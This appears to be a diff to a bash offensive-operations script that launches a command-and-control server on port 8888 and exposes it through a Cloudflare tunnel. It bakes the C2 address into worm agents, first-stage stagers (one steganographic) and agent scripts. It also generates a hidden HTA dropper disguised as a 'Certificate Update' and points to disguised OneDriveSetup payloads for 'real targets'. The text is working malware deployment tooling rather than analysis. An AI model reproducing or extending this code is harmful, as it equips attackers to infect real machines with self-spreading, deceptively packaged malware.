@@ -1477,16 +1477,39 @@ configure() {
     fi
 
     if [ "$DIRECTION" = "payload" ]; then
-        MY_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
-        [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-        ok "My IP auto-detected: $MY_IP"
+        # Smart IP detection — prefer VirtualBox host-only (VM testing), then LAN, then WiFi
+        local VBOX_IP LAN_IP WIFI_IP
+        VBOX_IP=$(ip -4 addr show vboxnet0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
+        LAN_IP=$(ip -4 addr show | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v 127 | grep -v "^10\.\|^172\." | head -1)
+        WIFI_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
         ALL_IPS=$(ip -4 addr show | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v 127 | tr '\n' '  ')
-        info "Available IPs: $ALL_IPS"
-        ask "Use a different IP? (Enter to keep $MY_IP, or type override e.g. 192.168.56.1):"
+
+        if [ -n "$VBOX_IP" ]; then
+            MY_IP="$VBOX_IP"
+            ok "VirtualBox host-only detected → auto-selected: ${W}$MY_IP${N} (VM testing mode)"
+        elif [ -n "$LAN_IP" ]; then
+            MY_IP="$LAN_IP"
+            ok "LAN IP detected → auto-selected: ${W}$MY_IP${N}"
+        else
+            MY_IP="$WIFI_IP"
+            ok "WiFi IP detected → auto-selected: ${W}$MY_IP${N}"
+        fi
+
+        info "All available IPs: $ALL_IPS"
+        ask "Override IP? (Enter to keep ${W}$MY_IP${N}, or type a different one):"
         read -r _OVERRIDE_IP
         [ -n "$_OVERRIDE_IP" ] && MY_IP="$_OVERRIDE_IP" && ok "Using: $MY_IP"
+
+        # Pre-flight: verify C2 port is free
+        if ss -tlnp 2>/dev/null | grep -q ":8888 "; then
+            ok "C2 port :8888 already in use — will reuse running instance"
+            PAYLOAD_REUSE_C2=1
+        else
+            PAYLOAD_REUSE_C2=0
+        fi
+
         info "No target domain needed — agent calls home to your C2"
-        info "C2 server will run on :8888 (web panel) — exposed via tunnel"
+        info "C2 server will run on :8888 → baking with ${W}$MY_IP${N}"
         log "Config: payload mode, ip=$MY_IP"
         wait_key
         return
@@ -5998,70 +6021,123 @@ cmd_mitm() {
         { sleep 999999; }
 }
 
+_chk() {
+    # _chk "label" "pass_msg" "fail_msg" <exit_on_fail>
+    local label="$1" ok_msg="$2" fail_msg="$3" fatal="${4:-0}"
+    if eval "$5" &>/dev/null; then
+        echo -e "  ${G}[✓]${N} ${W}${label}${N} — $ok_msg"
+        return 0
+    else
+        echo -e "  ${R}[✗]${N} ${W}${label}${N} — $fail_msg"
+        [ "$fatal" = "1" ] && exit 1
+        return 1
+    fi
+}
+
 cmd_payload() {
     init_files
     banner
-    MY_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
-    [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-
     mkdir -p "$OP/logs" "$OP/payloads"
-    info "Starting C2 server on :8888..."
-    pkill -f "c2_server.py" 2>/dev/null; sleep 1
-    LOG_DIR="$OP/logs" PAYLOAD_DIR="$OP/payloads" MY_IP="$MY_IP" \
-        C2_TLS=0 python3 "$C2_DIR/c2_server.py" >> "$OP/logs/c2.log" 2>&1 &
-    sleep 2
-    if ss -tlnp 2>/dev/null | grep -q ":8888 "; then
-        ok "C2 server running on :8888"
-    else
-        err "C2 failed — check $OP/logs/c2.log"; exit 1
-    fi
 
-    info "Opening Cloudflare tunnel..."
-    pkill -f "cloudflared tunnel --url\|cloudflared.*--config.*cf_quick" 2>/dev/null
-    sleep 1
+    # ── STEP 1: C2 Server ────────────────────────────────────────────────────
+    step "1/5" "C2 SERVER"
+    echo ""
+    if [ "${PAYLOAD_REUSE_C2:-0}" = "1" ] && ss -tlnp 2>/dev/null | grep -q ":8888 "; then
+        ok "C2 already running — reusing existing instance"
+    else
+        pkill -f "c2_server.py" 2>/dev/null; sleep 1
+        LOG_DIR="$OP/logs" PAYLOAD_DIR="$OP/payloads" MY_IP="$MY_IP" \
+            C2_TLS=0 python3 "$C2_DIR/c2_server.py" >> "$OP/logs/c2.log" 2>&1 &
+        local _t=0
+        while [ $_t -lt 8 ]; do
+            sleep 1; _t=$((_t+1))
+            ss -tlnp 2>/dev/null | grep -q ":8888 " && break
+            printf "  starting [%ds]\r" "$_t"
+        done
+        echo ""
+    fi
+    _chk "C2 port :8888" "listening" "NOT listening — check $OP/logs/c2.log" 1 \
+        "ss -tlnp 2>/dev/null | grep -q ':8888 '"
+    _chk "C2 HTTP" "responds OK" "not responding" 1 \
+        "curl -s --max-time 3 http://localhost:8888/ | grep -qi 'c2\|login\|panel\|html'"
+    _chk "C2 agent endpoint" "accepts beacons" "endpoint broken" 0 \
+        "curl -s --max-time 3 'http://localhost:8888/cdn-cgi/apps/init?v=probe' | grep -q '.'"
+    echo ""
+
+    # ── STEP 2: Tunnel ───────────────────────────────────────────────────────
+    step "2/5" "TUNNEL"
+    echo ""
+    pkill -f "cloudflared tunnel --url\|cloudflared.*--config.*cf_quick" 2>/dev/null; sleep 1
     printf "protocol: quic\nedge-ip-version: auto\n" > /tmp/cf_quick.yml
     cloudflared tunnel --config /tmp/cf_quick.yml --url http://localhost:8888 \
         --no-autoupdate > "$OP/logs/tunnel.log" 2>&1 &
     TUNNEL_PID=$!
-
-    info "Waiting for tunnel URL..."
+    local TUNNEL_URL=""
     for i in $(seq 1 25); do
         sleep 1
-        TUNNEL_URL=$(grep -o 'https://[a-z0-9][a-z0-9-]*-[a-z0-9][a-z0-9-]*\.trycloudflare\.com' "$OP/logs/tunnel.log" 2>/dev/null | head -1)
+        TUNNEL_URL=$(grep -o 'https://[a-z0-9][a-z0-9-]*-[a-z0-9][a-z0-9-]*\.trycloudflare\.com' \
+            "$OP/logs/tunnel.log" 2>/dev/null | head -1)
         [ -n "$TUNNEL_URL" ] && break
-        printf "  [%ds]\r" "$i"
+        printf "  waiting [%ds]\r" "$i"
     done
     echo ""
+    if [ -n "$TUNNEL_URL" ]; then
+        ok "Tunnel up: $TUNNEL_URL"
+        _chk "Tunnel reachable" "responds" "tunnel not reachable from this machine" 0 \
+            "curl -s --max-time 5 '$TUNNEL_URL/' | grep -qi 'html\|c2\|login'"
+    else
+        warn "Tunnel failed — will use direct IP only"
+        TUNNEL_URL=""
+    fi
+    echo ""
 
-    if [ -z "$TUNNEL_URL" ]; then
-        err "Tunnel failed — check $OP/logs/tunnel.log"; exit 1
+    # ── STEP 3: Choose C2 URL to bake ───────────────────────────────────────
+    step "3/5" "BAKE URL"
+    echo ""
+    echo -e "  C2 IP configured in Step 3: ${W}$MY_IP${N}"
+    echo ""
+    if [ -n "$TUNNEL_URL" ]; then
+        echo -e "  ${C}[1]${N} Tunnel URL  ${W}$TUNNEL_URL${N}  (internet / real targets)"
+        echo -e "  ${C}[2]${N} Direct IP   ${W}http://$MY_IP:8888${N}  (VM / LAN — fastest)"
+        ask "Choice [1/2]:"
+        read -r _BAKE_CHOICE
+    else
+        _BAKE_CHOICE="2"
+        warn "No tunnel — forced to direct IP"
     fi
 
-    ok "Tunnel: $TUNNEL_URL"
-    echo ""
-    echo -e "  ${C}Bake C2 URL as:${N}"
-    echo -e "  [1] Tunnel URL  — ${W}$TUNNEL_URL${N}  (internet targets)"
-    echo -e "  [2] Direct IP   — ${W}http://$MY_IP:8888${N}  (local VM / LAN targets)"
-    ask "Choice [1/2] (default 1):"
-    read -r _BAKE_CHOICE
     if [ "$_BAKE_CHOICE" = "2" ]; then
         C2URL="http://$MY_IP:8888"
-        ok "Baking with direct IP: $C2URL"
     else
         C2URL="$TUNNEL_URL"
     fi
-    # C2_PROXY: read from env or ~/.wizza_config; blank = direct
+    ok "Baking payload with: ${W}$C2URL${N}"
+
+    # Verify chosen URL is reachable from THIS machine
+    _chk "Chosen C2 URL" "reachable from host" "WARNING: not reachable — VM may still work if on same LAN" 0 \
+        "curl -s --max-time 4 '$C2URL/cdn-cgi/apps/init?v=selftest' | grep -q '.'"
+    echo ""
+
+    # ── STEP 4: Bake payloads ────────────────────────────────────────────────
+    step "4/5" "BAKING PAYLOADS"
+    echo ""
     C2PROXY="${C2_PROXY_BAKE:-}"
     [ -z "$C2PROXY" ] && C2PROXY=$(grep '^C2_PROXY=' "$WIZZA_CFG" 2>/dev/null | cut -d'=' -f2-)
     sed "s|__C2URL__|$C2URL|g; s|__C2PROXY__|$C2PROXY|g" "$AGENT_SRC/worm_agent.py"  > "$OP/payloads/worm_agent.py"
     sed "s|__C2URL__|$C2URL|g; s|__C2PROXY__|$C2PROXY|g" "$WORM_SRC/worm_agent.ps1"  > "$OP/payloads/worm_agent.ps1"
-    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/agent_http.py"  > "$OP/payloads/agent_http.py"
+    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/agent_http.py" > "$OP/payloads/agent_http.py"
     cp "$OP/payloads/agent_http.py" "$OP/payloads/agent.py"
-    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/agent.ps1"  > "$OP/payloads/agent.ps1"
-    # Bake stage1 loaders (tiny first-stage stagers)
-    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/stage1.ps1"       > "$OP/payloads/stage1.ps1"
-    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/stage1.py"        > "$OP/payloads/stage1.py"
+    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/agent.ps1"     > "$OP/payloads/agent.ps1"
+    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/stage1.ps1"    > "$OP/payloads/stage1.ps1"
+    sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/stage1.py"     > "$OP/payloads/stage1.py"
     sed "s|__C2URL__|$C2URL|g" "$AGENT_SRC/stage1_stego.ps1" > "$OP/payloads/stage1_stego.ps1"
+
+    # Verify C2URL baked correctly — no leftover placeholders
+    _chk "worm_agent.ps1 baked" "__C2URL__ replaced" "placeholder still present!" 1 \
+        "! grep -q '__C2URL__' '$OP/payloads/worm_agent.ps1'"
+    _chk "worm_agent.ps1 references C2" "correct URL in worm" "URL missing from worm" 0 \
+        "grep -q '$(echo $C2URL | sed 's|[/.]|\\&|g')' '$OP/payloads/worm_agent.ps1'"
+
     # Generate HTA for Windows
     cat > "$OP/payloads/SecureCertUpdate.hta" << HTAEOF
 <HTA:APPLICATION ID="CertUpdate" APPLICATIONNAME="Certificate Update" BORDER="none" BORDERSTYLE="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize">
@@ -6074,19 +6150,43 @@ Sub Window_OnLoad
 End Sub
 </script><body style="background:#fff"></body></HTA>
 HTAEOF
-    ok "Agents baked with C2 URL"
+    ok "HTA dropper generated"
+    echo ""
 
+    # ── STEP 5: Verify everything is wired ───────────────────────────────────
+    step "5/5" "VERIFICATION"
     echo ""
-    echo -e "  ${G}╔══════════════════════════════════════════════════════╗${N}"
-    echo -e "  ${G}║  ✓  C2 READY                                        ║${N}"
-    echo -e "  ${G}║                                                      ║${N}"
-    echo -e "  ${G}║  Link : ${W}$TUNNEL_URL${G}             ║${N}"
-    echo -e "  ${G}║  Panel: ${W}$TUNNEL_URL/panel${G}       ║${N}"
-    echo -e "  ${G}║                                                      ║${N}"
-    echo -e "  ${G}║  Agents in: $OP/payloads/${G}         ║${N}"
-    echo -e "  ${G}╚══════════════════════════════════════════════════════╝${N}"
+    _chk "C2 still alive" "responding" "C2 died during bake!" 1 \
+        "curl -s --max-time 3 http://localhost:8888/ | grep -qi 'html'"
+    _chk "C2 beacon endpoint" "returns token" "broken — agents won't connect" 0 \
+        "curl -s --max-time 3 'http://$MY_IP:8888/cdn-cgi/apps/init?v=verify' | grep -q '.'"
+    _chk "worm_agent.ps1" "exists and baked" "missing!" 1 \
+        "[ -s '$OP/payloads/worm_agent.ps1' ]"
+    _chk "worm_agent.py" "exists and baked" "missing!" 0 \
+        "[ -s '$OP/payloads/worm_agent.py' ]"
+    [ -n "$TUNNEL_URL" ] && _chk "Tunnel" "still alive" "tunnel died" 0 \
+        "kill -0 $TUNNEL_PID 2>/dev/null"
     echo ""
-    info "Tailing C2 log — Ctrl+C to stop"
+
+    # ── FINAL STATUS BOARD ───────────────────────────────────────────────────
+    local _PANEL_URL="${TUNNEL_URL:-http://$MY_IP:8888}"
+    echo -e "  ${G}╔══════════════════════════════════════════════════════════╗${N}"
+    echo -e "  ${G}║  ALL SYSTEMS GO                                          ║${N}"
+    echo -e "  ${G}╠══════════════════════════════════════════════════════════╣${N}"
+    echo -e "  ${G}║${N}  C2 IP baked  : ${W}$MY_IP${N}"
+    echo -e "  ${G}║${N}  Beacon URL   : ${W}$C2URL${N}"
+    [ -n "$TUNNEL_URL" ] && \
+    echo -e "  ${G}║${N}  Tunnel       : ${W}$TUNNEL_URL${N}"
+    echo -e "  ${G}║${N}  Panel        : ${W}${_PANEL_URL}/panel${N}"
+    echo -e "  ${G}║${N}  Payloads dir : ${W}$OP/payloads/${N}"
+    echo -e "  ${G}╠══════════════════════════════════════════════════════════╣${N}"
+    echo -e "  ${G}║${N}  VM TEST → copy to TRANSFER and run HTA on the VM"
+    echo -e "  ${G}║${N}  ${W}cp $OP/payloads/disguised/OneDriveSetup.{hta,dat,proj} ~/TRANSFER/${N}"
+    echo -e "  ${G}╚══════════════════════════════════════════════════════════╝${N}"
+    echo ""
+    log "Payload ready: $C2URL (baked ip=$MY_IP)"
+    info "Watching for agents — Ctrl+C to stop"
+    echo ""
     tail -f "$OP/logs/c2.log"
 }
 
